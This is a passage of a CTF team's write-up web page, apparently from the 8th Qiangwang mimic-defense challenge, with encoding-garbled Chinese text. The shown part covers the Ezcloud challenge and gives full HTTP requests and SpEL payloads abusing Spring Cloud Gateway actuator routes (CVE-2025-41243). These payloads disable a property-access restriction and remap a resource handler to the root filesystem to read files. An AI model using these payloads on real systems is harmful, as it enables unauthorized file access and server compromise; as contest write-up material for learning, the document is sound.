<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› SU Writeup -</title><meta name=description content="æœ¬æ¬¡ å¼ºç½‘æ‹Ÿæ€çº¿ä¸Šé¢„é€‰èµ› æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› çš„ WriteUpã€‚"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/ntfy-2025-su-wu\/","name":"ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› SU Writeup","description":"æœ¬æ¬¡ å¼ºç½‘æ‹Ÿæ€çº¿ä¸Šé¢„é€‰èµ› æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚\nä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› çš„ WriteUpã€‚\n","inLanguage":"en","wordCount":7601,"datePublished":"2025-10-27T23:24:08\u002b00:00","dateModified":"2025-10-27T23:24:08\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["æ‹Ÿæ€"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/ntfy-2025-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› SU Writeup"><meta property="og:description" content="æœ¬æ¬¡ å¼ºç½‘æ‹Ÿæ€çº¿ä¸Šé¢„é€‰èµ› æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› çš„ WriteUpã€‚"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/ntfy-2025-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› SU Writeup"><meta name=twitter:description content="æœ¬æ¬¡ å¼ºç½‘æ‹Ÿæ€çº¿ä¸Šé¢„é€‰èµ› æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› çš„ WriteUpã€‚"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href="https://su-team.cn/css/codeblock.css?v=20260212-fix3"><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on October 27, 27108
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;36&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;7601&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#ezcloud>Ezcloud</a></li><li><a href=#safesecret>safesecret</a></li><li><a href=#smallcode>smallcode</a></li><li><a href=#ecshop>ecshop</a></li></ul></li><li><a href=#reverse>Reverse</a><ul><li><a href=#hyperjump>HyperJump</a></li><li><a href=#icall>Icall</a></li></ul></li><li><a href=#mobile>Mobile</a><ul><li><a href=#ezminiapp>EzMiniApp</a></li><li><a href=#just>Just</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#unsafe-parameters>Unsafe Parameters</a></li><li><a href=#fms>FMS</a></li><li><a href=#blockchain>blockchain</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#ciallo_encrypt>Ciallo_Encrypt</a></li></ul></li><li><a href=#ä½ç©ºç»æµç½‘ç»œå®‰å…¨>ä½ç©ºç»æµç½‘ç»œå®‰å…¨</a><ul><li><a href=#the-hidden-link>The Hidden Link</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#stack>stack</a></li><li><a href=#pinnote>PinNote</a></li><li><a href=#aaaheap>aaaheap</a></li><li><a href=#babystack>babystack</a></li></ul></li><li><a href=#è½¦è”ç½‘>è½¦è”ç½‘</a><ul><li><a href=#can>Can</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>æœ¬æ¬¡ å¼ºç½‘æ‹Ÿæ€çº¿ä¸Šé¢„é€‰èµ› æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€åğŸ† çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼š<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a> æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚</p><p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› çš„ WriteUpã€‚</p><h1 id=web>Web</h1><h2 id=ezcloud>Ezcloud</h2><p>æœ€å¼€å§‹æ˜¯æ‰¾åˆ°äº† <a href=https://blog.csdn.net/guo15890025019/article/details/129503346>https://blog.csdn.net/guo15890025019/article/details/129503346</a></p><p>ä½†æ˜¯å¤ç°æ€ä¹ˆéƒ½ä¸æˆåŠŸï¼Œåˆ›å»ºè·¯ç”±å‰é¢éƒ½æ˜¯å¯¹çš„ï¼Œç„¶åæ‰¾æœ‰æ²¡å¾—Bypassï¼Œæ‰¾åˆ°è¿™ä¸ª</p><p><a href=https://rce.moe/2025/09/29/CVE-2025-41243>https://rce.moe/2025/09/29/CVE-2025-41243</a> æ­£å¥½è§£å†³æˆ‘çš„é—®é¢˜ï¼Œç›´æ¥å¼€å¹²</p><p>é€šè¿‡bean map ç¦ç”¨å®‰å…¨é™åˆ¶ï¼Œç„¶ååˆ·æ–°è·¯ç”±ã€æ·»åŠ è·¯ç”±</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/actuator/gateway/routes/step1</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>web-632dc679bf.challenge.xctf.org.cn:80</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;step1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;filters&#34;</span><span class=p>:</span> <span class=p>[{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;AddResponseHeader&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Result&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;#{ @systemProperties[&#39;spring.cloud.gateway.restrictive-property-accessor.enabled&#39;] = &#39;false&#39; }&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}],</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;uri&#34;</span><span class=p>:</span> <span class=s2>&#34;http://example.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;predicates&#34;</span><span class=p>:</span> <span class=p>[{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Path&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;_genkey_0&#34;</span><span class=p>:</span> <span class=s2>&#34;/step1/**&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/actuator/gateway/refresh</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>web-632dc679bf.challenge.xctf.org.cn:80</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/actuator/gateway/routes/step1</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>web-632dc679bf.challenge.xctf.org.cn:80</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;step1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;filters&#34;</span><span class=p>:</span> <span class=p>[{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;AddResponseHeader&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Result&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;#{ @systemProperties[&#39;spring.cloud.gateway.restrictive-property-accessor.enabled&#39;] = &#39;false&#39; }&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}],</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;uri&#34;</span><span class=p>:</span> <span class=s2>&#34;http://example.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;predicates&#34;</span><span class=p>:</span> <span class=p>[{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Path&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;_genkey_0&#34;</span><span class=p>:</span> <span class=s2>&#34;/step1/**&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åä¿®æ”¹é…ç½®</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;step2&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;filters&#34;</span><span class=p>:</span> <span class=p>[{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;AddResponseHeader&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Result&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;#{ @resourceHandlerMapping.urlMap[&#39;/webjars/**&#39;].locationValues[0]=&#39;file:///&#39; }&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}],</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;uri&#34;</span><span class=p>:</span> <span class=s2>&#34;http://example.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;predicates&#34;</span><span class=p>:</span> <span class=p>[{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Path&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;_genkey_0&#34;</span><span class=p>:</span> <span class=s2>&#34;/step2/**&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç»§ç»­ä¿®æ”¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;step3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;filters&#34;</span><span class=p>:</span> <span class=p>[{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;AddResponseHeader&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Result&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;#{ @resourceHandlerMapping.urlMap[&#39;/webjars/**&#39;].afterPropertiesSet }&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}],</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;uri&#34;</span><span class=p>:</span> <span class=s2>&#34;http://example.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;predicates&#34;</span><span class=p>:</span> <span class=p>[{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Path&#34;</span><span class=p>,</span>
